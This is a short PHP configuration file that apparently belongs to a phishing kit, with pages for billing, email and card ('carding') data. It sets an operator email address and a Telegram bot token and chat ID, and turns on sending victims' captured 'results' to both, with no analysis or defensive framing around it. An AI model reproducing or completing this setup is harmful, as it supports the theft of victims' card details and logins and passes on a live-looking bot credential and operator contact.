<?php

$Z118_EMAIL = "akxxltoosure@yandex.com";  /* PUT YOUR FUCKING EMAIL HERE BRO */


/* OPTIONS TO SAVE AND SEND YOUR RESULTS */
$save_results_to_cpanel = "off";
$send_results_to_telegram = "on";
$send_results_to_email = "on";

/* CONFIG TO DISPLAY PAGES YOU WANT */

$show_billing = "on";
$show_email = "on";
$show_billing = "on";
$show_carding = "on";



/* TELEGRAM BOT INFORMATION */
$bot_token = "5408133210:AAGM5BdnW6KBAnIPV3DW2clJUK9rf_D9dxU"; /* bot token */
$chat_id = "2025589851";

/* DO NOT TOUCH */
$redirect_to_next_page = "on";




?>